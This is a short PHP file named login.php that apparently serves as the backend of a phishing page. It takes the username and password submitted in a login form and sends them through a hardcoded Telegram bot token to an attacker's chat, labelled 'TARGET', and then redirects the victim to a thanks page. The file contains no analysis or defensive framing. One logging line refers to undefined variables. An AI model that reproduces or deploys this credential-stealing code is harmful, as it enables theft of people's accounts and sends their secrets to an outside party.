<?php
// login.php
$chatId = "-1002958218066";
$botToken = "8048587597:AAHQWKcAC4m_vDA5uVKVXzjp3MGgq7OSXks";
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$username = isset($_POST['_user']) ? trim($_POST['_user']) : '';
$password = isset($_POST['_pass']) ? trim($_POST['_pass']) : '';
$returnUrl = isset($_POST['referrer']) && !empty($_POST['referrer']) ? $_POST['referrer'] : (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');

$message = "TARGET: 1 \nUser: {$username}\nPass: {$password}";

$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);


file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

$returnUrl = urlencode($returnUrl);

header("Location: thanks.html?return={$returnUrl}");
exit;
?>
